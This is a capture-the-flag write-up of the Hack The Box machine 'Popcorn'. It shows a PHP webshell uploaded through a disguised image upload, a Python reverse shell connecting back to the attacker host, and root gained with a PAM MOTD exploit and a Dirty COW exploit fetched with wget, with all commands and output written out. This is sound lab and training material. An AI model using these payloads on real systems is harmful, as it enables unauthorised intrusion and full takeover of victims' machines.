# Hackthebox Popcorn


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

### Nmap

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Mon Oct  8 19:41:38 2018 as: nmap -v -sV -oA popcorn_tcp 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.053s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

At he same time we start a more extensive scan scanning all tcp ports and services. The extended scan showed no additional services on the box.

Feeding the nmap xml file into searchsploit we can quickly search for known exploits for the discovered services

```
root@kali:~/htb/popcorn# searchsploit --nmap popcorn_tcp_full.xml                                                                                                                                            
[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...                                                                                                                 
[i] Reading: 'popcorn_tcp_full.xml'                                                                                                                                                                          
                                                                                                                                                                                                             
[i] /usr/bin/searchsploit -t openssh 5 1p1 debian 6ubuntu2                                                                                                                                                   
[i] /usr/bin/searchsploit -t apache httpd 2 2 12                                                                                                                                                             
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------$
 Exploit Title                                                                                                                                                      |  Path                                  
                                                                                                                                                                    | (/usr/share/exploitdb/)                
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------$
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi                                                                                       | exploits/multiple/dos/19536.txt        
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------$
Shellcodes: No Result                                                
```

This time, this did not get a hit, but I find this functionality in the searchsploit script extremly valuable.


### Content Discovery

So we have a webserver listening on port 80. When we visit the page we are served a standard Apache "It works!" page.

Running Gobuster with the raft-large-directories.txt wordlist from the Seclists project, we find a couple of interesting folders.

```
=====================================================                                               
Gobuster v2.0.0              OJ Reeves (@TheColonial)                                            
=====================================================                                         
[+] Mode         : dir                                                                             
[+] Url/Domain   : http://10.10.10.6/                                                              
[+] Threads      : 10                                                                             
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt     
[+] Status codes : 200,204,301,302,307,403                                                          
[+] Timeout      : 10s                                                                                
=====================================================                                             
2018/10/08 19:43:41 Starting gobuster                                                              
=====================================================                                           
/test (Status: 200)                                                                                  
/index (Status: 200)                                                                                
/torrent (Status: 301)                                                                                                                                             
/rename (Status: 301)                                                                               
=====================================================         
2018/10/08 19:48:51 Finished                                                                      
===================================================== 
```
/test is a phpinfo() page which reveals a lot of juicy information to us. The following version information about the system can be found on the page:

PHP Version: 5.2.10-2ubuntu6.10
Kernel Version: Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu
Suhosin Patch 0.9.7
OpenSSL 0.9.8g 19 Oct 2007
libXML Version: 2.7.5 

Among others. These may come in handy.


## Initial Compromise

Visiting the /torrent folder we are presented with a application called "Torrent hoster". What does searchsploit say about this one?

```
root@kali:~/htb/popcorn# searchsploit torrent hoster
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Torrent Hoster - Remount Upload                                                                                                                                     | exploits/php/webapps/11746.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
### File upload restriction bypass leading to RCE

Interesting, examening the exploit, the endpoint "torrenthoster//torrents.php?mode=upload" should be vulnerable to a file upload issue. After some time trying to get the exploit to work, I ruled it out as a rabbit hole.

There are however another file upload functionality that is interesting. If we register an account on the page and upload a legitimate torrent file, we can change the image of the torrent by navigating to "Edit this torrent" --> "Update Screenshot".

Here we can upload a php shell as the image.

```
POST /torrent/upload_file.php?mode=upload&id=9d20536552c00a9e4b3a2b0ae82332ca088d6b12 HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.6/torrent/edit.php?mode=edit&id=9d20536552c00a9e4b3a2b0ae82332ca088d6b12
Content-Type: multipart/form-data; boundary=---------------------------18750189121695846243797441454
Content-Length: 637
Cookie: /torrent/=; /torrent/login.php=; saveit_0=4; saveit_1=0; /torrent/torrents.php=; /torrent/torrents.phpfirsttimeload=1; PHPSESSID=2912f539612ce7e4a624d915232022b9
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------18750189121695846243797441454
Content-Disposition: form-data; name="file"; filename="logo.png.php"
Content-Type: image/png

PNG

<?php echo shell_exec($_GET['cmd']);?>

-----------------------------18750189121695846243797441454
Content-Disposition: form-data; name="submit"

Submit Screenshot
-----------------------------18750189121695846243797441454--
```
With our shell uploaded we can execute command with the following GET request:

```
http://10.10.10.6/torrent/upload/9d20536552c00a9e4b3a2b0ae82332ca088d6b12.php?cmd=id


‰PNG  uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits in our privesc may require a full TTY to work. Trust me, I have learned this the hard way.

Through our webshell, we can execute a Python reverse shell to get a proper interactive shell on the box.

```
http://10.10.10.6/torrent/upload/9d20536552c00a9e4b3a2b0ae82332ca088d6b12.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.14%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```
And catch our incomming shell.

```
root@kali:~/htb/popcorn# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.6: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.6] 50815
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can then further spawn a TTY using python again

```
$ python -c "import pty;pty.spawn('/bin/bash')"  

www-data@popcorn:/var/www/torrent/upload$ 
```

## Privilege Escalation

A typical Linux privilege Escalation is based on one of the follwing:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

There are several script that automates the process of checking for these issues.


Running our usual privesc script one thing kind of sticks out:

```
[+] World Writable Files
    -rw-rw-rw- 1 root root 165 Oct  8 07:58 /var/run/motd
```
There is a world writeable file called motd that is owned by root.

### Linux PAM 1.1.0 - MOTD File Tampering

Let's consult searchsploit

```
root@kali:~/htb# searchsploit motd
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1)                                                                                  | exploits/linux/local/14273.sh
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)                                                                                  | exploits/linux/local/14339.sh
MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD Deletion                                                                                                           | exploits/windows/dos/1235.c
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Ok, we have a potential privesc exploit. Let's try to verify the version of motd on the victim

```
www-data@popcorn:/home/george$ dpkg -l | grep motd
dpkg -l | grep motd
www-data@popcorn:/home/george$ dpkg -l | grep PAM
dpkg -l | grep PAM
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
www-data@popcorn:/home/george$ 
```

Searhing for motd in the package manager came up empty. Searching for PAM however indicates that the vulnerable version is installed.

Let's also verify that we run the OS that is specified in the vulnerability

```
cat /etc/issue                                                                                 
Ubuntu 9.10 \n \l 
```

Bingo, all prerequisites are met. Let's download the exploit and run it

```
www-data@popcorn:/dev/shm$ ./14339.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

### Dirty COW (CVE-2016-5195) 

Looking at the kernel of the box, it suggests that it could be vulnerable to a number of kernel exploits.

```
www-data@popcorn:/dev/shm$ perl linux-exploit-suggester-2.pl                                                                                                                                     
                                                                                                                                                                                                             
  #############################                                                                                                                                                                              
    Linux Exploit Suggester 2                                                                                                                                                                                
  #############################                                                                                                                                                                              
                                                                                                                                                                                                             
  Local Kernel: 2.6.31                                                                                                                                                                                       
  Searching among 71 exploits...                                                                                                                                                                             
                                                                                                                                                                                                             
  Possible Exploits:                                                                                                                                                                                         
[+] american-sign-language                                                                                                                                                                                   
     CVE-2010-4347                                                                                                                                                                                           
     Source: http://www.securityfocus.com/bid/45408/                                                                                                                                                         
[+] can_bcm                                                                                                                                                                                                  
     CVE-2010-2959
     Source: http://www.exploit-db.com/exploits/14814/
[+] dirty_cow
     CVE-2016-5195
     Source: https://www.exploit-db.com/exploits/40616/
[+] do_pages_move
     Alt: sieve      CVE-2010-0415
     Source: Spenders Enlightenment
[+] half_nelson
     Alt: econet      CVE-2010-3848
     Source: http://www.exploit-db.com/exploits/6851
[+] half_nelson1
     Alt: econet      CVE-2010-3848
     Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson2
     Alt: econet      CVE-2010-3850
     Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson3
     Alt: econet      CVE-2010-4073
     Source: http://www.exploit-db.com/exploits/17787/
[+] msr
     CVE-2013-0268
     Source: http://www.exploit-db.com/exploits/27297/
[+] pipe.c_32bit
     CVE-2009-3547
     Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c
[+] pktcdvd
     CVE-2010-3437
     Source: http://www.exploit-db.com/exploits/15150/
[+] ptrace_kmod2
     Alt: ia32syscall,robert_you_suck      CVE-2010-3301
     Source: http://www.exploit-db.com/exploits/15023/
[+] rawmodePTY
     CVE-2014-0196
     Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
[+] rds
     CVE-2010-3904
     Source: http://www.exploit-db.com/exploits/15285/
[+] reiserfs
     CVE-2010-1146
     Source: http://www.exploit-db.com/exploits/12130/
[+] video4linux
     CVE-2010-3081
     Source: http://www.exploit-db.com/exploits/15024/
```

Let's try to use Dirty Cow.

I used the folloing exploit: https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

```
www-data@popcorn:/dev/shm$ wget http://10.10.14.17:8000/exploits/dirty.c
--2018-11-06 23:53:07--  http://10.10.14.17:8000/exploits/dirty.c
Connecting to 10.10.14.17:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/plain]
Saving to: `dirty.c'

100%[======================================>] 4,815       --.-K/s   in 0s      

2018-11-06 23:53:07 (12.6 MB/s) - `dirty.c' saved [4815/4815]

www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt 
www-data@popcorn:/dev/shm$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fibnRbOmlleQM:0:0:pwned:/root:/bin/bash

mmap: b7842000
```

Then we just need to SSH into the box with firefart:hacker to get root.
